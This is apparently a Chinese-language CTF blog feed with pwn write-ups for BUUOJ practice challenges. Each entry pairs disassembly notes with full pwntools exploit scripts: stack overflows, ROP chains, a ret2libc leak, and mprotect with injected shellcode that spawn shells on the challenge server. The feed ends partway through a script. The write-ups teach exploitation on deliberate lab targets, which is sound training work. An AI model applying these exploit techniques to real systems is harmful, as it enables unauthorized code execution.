      <link href="/2022/07/buuoj-pwn-wp2/"/>
      <url>/2022/07/buuoj-pwn-wp2/</url>
      
        <content type="html"><![CDATA[<p>持续更新</p><h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2><p>checksec,Canary,PIE,NX均开启<br><img src="2022-07-28%20125400.jpg" alt="checksec1"></p><p>IDA分析<br><img src="2022-07-28%20125812.jpg" alt="IDA1"><br>所以只需要使var_13的值为17即可拿shell，isoc99_scanf未限定输入长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28421</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>) <span class="comment"># int有4字节</span></span><br><span class="line"><span class="comment"># payload = p32(17) * 14</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;87eae600-681d-4257-9cbc-5c49f597082f&#125;</code></p><h2 id="jarvisoj-level2">jarvisoj_level2</h2><p>checksec，再IDA分析<br><img src="2022-07-28%20132109.jpg" alt="IDA2"><br>buf分配的空间大小明显小于read函数允许读入的字符长度，存在栈溢出。<br>且该程序有system函数和’/bin/sh’，可以构造拿shell。很简单的栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25097</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;877fe44d-2b7a-4891-abf9-1e998db084ec&#125;</code></p><h2 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h2><p>checksec，再IDA分析<br><img src="2022-07-28%20132857.jpg" alt="IDA3"><br>存在backdoor函数，可以直接调用<code>system('/bin/sh')</code>拿shell。<br>main函数中read函数读入的字符串长度是我们自己控制的，给buf分配的空间却是固定的，我们可以输入一个较大的数字，从而使程序发生栈溢出。<br><img src="2022-07-28%20133313.jpg" alt="gdb1"><br>需要(0x10+0x8)个字节的垃圾数据，还需要backdoor函数的地址，编写脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27010</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400833</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># </span></span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) <span class="comment"># </span></span><br><span class="line"><span class="comment"># 开始时没没看到bakcdoor函数，使用的是ROP，使用以下语句进行替换也是可以的</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">length_payload = <span class="built_in">len</span>(payload)</span><br><span class="line"><span class="comment"># length_payload = flat([str(length_payload)]) 建议添加这条语句</span></span><br><span class="line"><span class="comment"># r.sendline(length_payload)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;b2fb4957-e796-4af5-8112-86c2b7eba6c0&#125;</code></p><h2 id="OGeek2019-babyrop">[OGeek2019]babyrop</h2><p>checksec<br>IDA分析<br><img src="2022-07-28%20165405.jpg" alt="1"><br><img src="2022-07-28%20165344.jpg" alt="2"><br><img src="2022-07-28%20165423.jpg" alt="3"><br>main中buf为随机产生的字符串，sub_804871F中要求我们输入字符串与随机产生的字符串一定长度字符相同，否则程序直接退出。<br>我们只需要使strncmp函数返回结果为0即可。<br>strlen是遇到’\x00’后停止计算，所以我们可以令第一个字符为’\x00’，若传入strncmp()的长度参数为0，则strncmp函数返回值为0。<br>sub_804871F返回值为buf[7]，即buf的第8个元素，有作为参数传入sub_80487D0中。若buf[7]的值不为127，则读入的字符串长度为buf[7]的值。<br>buf[7]为int8(8位int)，sub_804871F中buf长度为231字节，小于2^8-1，可能存在栈溢出。<br>此题没有system函数和’/bin/sh’，我们需要再got表中读取某个函数，这里我们选用write读取write自身的地址。读取后接收返回数据，并返回main函数。<br>发送的第一个payload可构造为b’\x00’ + (6个垃圾数据) + b’\xff’<br>发送的第二个payload为b’a’ * (0xe7 + 0x4) + write函数的plt地址 + main函数 + write第一个参数1 + write在got表中的地址 + write的第二个参数4<br>回到main函数后发送重复第一个payload，再发送第三个payload<br>第三个payload为b’a’ * (0xe7 + 0x4) + system函数地址 + 4字节垃圾数据 + '/bin/sh’地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26711</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23(2).so&#x27;</span>)</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># main_addr = elf.symbols[&#x27;main&#x27;]</span></span><br><span class="line"><span class="comment"># print(hex(write_plt),hex(write_got),hex(main_addr))</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">6</span> + <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),write_plt,main_addr,<span class="number">1</span>,write_got,<span class="number">4</span>])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"><span class="comment"># print(r.recv(4))</span></span><br><span class="line">libc_write = u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_write))</span><br><span class="line">libc_base = libc_write - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload3 = flat([<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">0x4</span>),libc_system,<span class="number">0xdead</span>,bin_sh_addr])</span><br><span class="line">r.sendline(payload1)</span><br><span class="line"><span class="built_in">print</span>(r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>))</span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还是卡了好久，发现是libc版本问题，一开始使用的是64位的libc，后来换用32位libc成功打通。<br>flag为<code>flag&#123;f1dc0359-776a-4051-8b3a-072bf3782083&#125;</code></p><h2 id="get-started-3dsctf-2016">get_started_3dsctf_2016</h2><p>先checksec<br><img src="2022-07-30%20221500.jpg" alt="checksec"><br>有一个小姿势是linux下<code>file</code>命令可以查看文件信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file 文件名</span><br></pre></td></tr></table></figure><p><img src="2022-07-30%20221704.jpg" alt=""><br>这个文件是静态链接的<br>不过在此题中没太大用（只是看到IDA里面一堆函数，心血来潮看一下）<br><img src="2022-07-30%20222232.jpg" alt="IDA main"><br>main函数中gets函数存在栈溢出。<br><img src="2022-07-30%20222432.jpg" alt="IDA get_flag"><br>get_flag里可以读取flag.txt文件内容，只要满足a1,a2变量的条件即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag_addr = elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"><span class="comment"># print(hex(get_flag_addr))</span></span><br><span class="line">a1 = <span class="number">814536271</span></span><br><span class="line">a2 = <span class="number">425138641</span></span><br><span class="line">dead = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x38</span>) + p32(get_flag_addr) + p32(dead) + p32(a1) +p32(a2)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>值得注意的是，我们在构造payload时很多时候都不会考虑到程序退出的问题。<br>因为我们调用system函数时，系统会先调用fork()创建子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。我们通常的拿shell方式是调用系统调用函数（包括system(),execve()等函数），此时是我们与操作系统创建的子进程进行交互，通常可以正常得到回显的结果，拿到结果，返回程序进程后，如果我们payload给出的是一个无效返回地址，程序会崩溃退出，但此时已经与我们没有什么关系了。<br>但本题不一样，如果本题无法正常退出，我们就拿不到返回结果。所以我们可以调用exit函数，让程序正常退出。<br>flag为<code>flag&#123;8ce19758-b912-4823-a0ff-6e86353b8d9b&#125;</code></p><p>在网上看到另一种方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *start, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p>第一个参数填的是一个地址，是指需要进行操作的地址。<br>第二个参数是地址往后多大的长度。<br>第三个参数的是要赋予的权限。<br>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。(作用比较类似于在逆向hook部分提到的virtualprotect())<br>我们可以将一段内存设定为可读可写可执行，然后用ret2shellcode的手法，将shellcode写入该段内存，从而执行shellcode拿shell。(prot = 7)<br>指定的内存区间必须包含整个内存页（linux中一般为4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>至于如何将shellcode写入内存指定位置，使用read()即可将指定长度的字符写入以给定地址开始的一段内存中。这也是常见手法。<br>pwntools自带的<code>shellcrft.sh()</code>可以生成<code>system('/bin/sh')</code>的机器码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># exp是网上找到现成的</span></span><br><span class="line">q = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25642</span>)</span><br><span class="line"><span class="comment">#q = process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">mprotect = <span class="number">0x0806EC80</span></span><br><span class="line">buf = <span class="number">0x80ea000</span></span><br><span class="line">pop_3_ret = <span class="number">0x0804f460</span></span><br><span class="line">read_addr = <span class="number">0x0806E140</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop_3_ret)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">0x7</span>)</span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(buf)</span><br><span class="line">payload += p32(<span class="number">0x100</span>)</span><br><span class="line">q.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">q.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">q.interactive()</span><br></pre></td></tr></table></figure><p>还有一种方法是我自己尝试使用的，既然这里禁掉了system()，那么我还可以直接调用系统调用函数execve拿shell，我只需要构造gadget给eax,ebx,ecx,edx赋值即可，再调用中断指令调用系统函数。本题是静态链接，寻找合适的gadget很容易。缺少’/bin/sh’可以用’sh’替代。可惜没有成功。</p><h2 id="jarvisoj-level2-x64">jarvisoj_level2_x64</h2><p>与jarvisoj_level2类似，只是文件是x64。<br>x86和x64一个主要区别是传参方式不同。<br>先checksec<br>大体思路与jarvisoj_level2类似，只是给system函数传参时，要将参数传给rdi，所以需要寻找<code>pop rdi|ret</code>的gadget。<br>直接放脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25081</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2_x64&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flag为<code>flag&#123;8ae1b539-6038-46c4-a4bf-e12a20e3fbb8&#125;</code></p><h2 id="HarekazeCTF2019-baby-rop">[HarekazeCTF2019]baby_rop</h2><p>先checksec<br>main函数<br><img src="2022-07-30%20232629.jpg" alt="IDA"><br>isoc99_scanf()未限制输入长度，会造成栈溢出。（可以简简单单测试一波，输入一段很长的数据会出现段错误）。<br>system和’/bin/sh’都有，可以快快乐乐的拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyrop&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>, pop_rdi_ret, bin_sh_addr, system_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell后需要在靶机文件系统中，寻找flag。一般用户文件放在home目录下，进home/babyrop目录可以找到flag。（一开始我以为babyrop是我们拿到的程序，被骗了）。<br>直接<code>find -name flag</code>比较方便。<br>flag为<code>flag&#123;e9a771df-0b2a-4320-af06-3c5635d6aa20&#125;</code></p><h2 id="ciscn-2019-en-2">ciscn_2019_en_2</h2><p>IDA分析后发现和之前的ciscn_2019_c_1好像是一样。<br>最离谱的是我仅修改了之前的exp的端口号，竟然就打通了……</p><h2 id="not-the-same-3dsctf-2016">not_the_same_3dsctf_2016</h2><p>先checksec<br>IDA中有函数和get_secret函数<br><img src="2022-07-31%20203607.jpg" alt=""><br><img src="2022-07-31%20203642.jpg" alt=""><br>main函数中gets函数存在栈溢出，get_secret函数中读取了flag.txt文件中的内容，并存入fl4g中，fl4g位于bss段。<br>所以我们可以劫持程序流执行到get_secret函数。又由于get_secret无法直接打印flag，所以我们要调用printf等具有打印功能的函数，这里选用printf。<br>和前面get_started_3dsctf_2016一样，我们的程序需要正常退出才有回显，所以需要找到exit函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29107</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag = elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]</span><br><span class="line">exit_addr = elf.symbols[<span class="string">&#x27;exit&#x27;</span>]</span><br><span class="line">flag = elf.symbols[<span class="string">&#x27;fl4g&#x27;</span>]</span><br><span class="line">printf_addr = elf.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">45</span>, get_flag, printf_addr, exit_addr, flag, <span class="number">0</span>])</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;m3m0... &#x27;)</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure><p>本题另一个方法与思路get_started_3dsctf_2016一样。<br>flag为<code>flag&#123;94dd8687-184a-40cd-8f6f-b4cbf0dc553f&#125;</code></p><h2 id="ciscn-2019-n-5">ciscn_2019_n_5</h2><p>checksec，存在可写可执行段。<br><img src="2022-07-31%20204203.jpg" alt=""><br><img src="2022-07-31%20204339.jpg" alt=""><br>main函数中首先读入字符串存入name中，name位于bss段，然后gets函数读入v4，存在栈溢出。<br>第一个思路是向bss段写入shellcode，然后劫持程序执行流执行shellcode。<br><img src="2022-07-31%20204731.jpg" alt=""><br>首先向name发送shellcode，在gets函数中需要写入的填充数据长度为0x28字节，和name的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25356</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_n_5&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"><span class="comment"># r.recvuntil(&#x27;?\n&#x27;)</span></span><br><span class="line">shellcode_addr = elf.symbols[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">payload = flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>, shellcode_addr])</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>还有另一种方法类似于ret2libc，先泄露函数地址，输出，再返回main函数，调用system函数拿shell，不过没有拿到回显地址，没有打成。</p><p>flag为<code>flag&#123;aad9d677-0040-44b9-8eec-978bde7f8360&#125;</code>。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 1</title>
      <link href="/2022/07/buuoj-pwn-wp1/"/>
      <url>/2022/07/buuoj-pwn-wp1/</url>
      
        <content type="html"><![CDATA[<p>持续更新<br>相关知识会更新在其他文章中。</p><h2 id="test-your-nc">test_your_nc</h2><p>先checksec，是64位程序，拖入IDA。</p><p>main函数是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如同名字一样，直接使用nc进行连接，或者编写脚本进行连接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28795</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./test&#x27;)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>就可以直接拿shell，<code>ls</code> + <code>cat flag</code>搞定<br>flag为<code>flag&#123;dd3017eb-3297-48de-a5e4-799b37b9e81a&#125;</code></p><h2 id="rip">rip</h2><p>思路类似于ret2text<br>先checksec，是64位程序，且基本没有保护。IDA分析</p><p>其中main函数为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">15</span>]; <span class="comment">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input&quot;</span>);</span><br><span class="line">  gets(s, argv);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ok,bye!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun函数可能是自己写的，进去看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fun函数是后门函数，只需要将程序执行流劫持到fun函数即可。<br>main函数中gets函数是危险函数，可以发生栈溢出，可以覆盖返回地址，从而劫持程序流。<br>使用pwndbg分析，可以得到s的起始地址与栈底(rbp)的距离为15个字节（当时一直以为会是8的整数倍，卡了好久）<br>而rbp距离函数的返回地址间有8字节，用于存放父函数rbp的地址。<br>只需要填充15 + 8字节的垃圾数据，再填上fun函数的地址即可。<br>发送即可拿shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29236</span>)</span><br><span class="line"><span class="comment"># a = 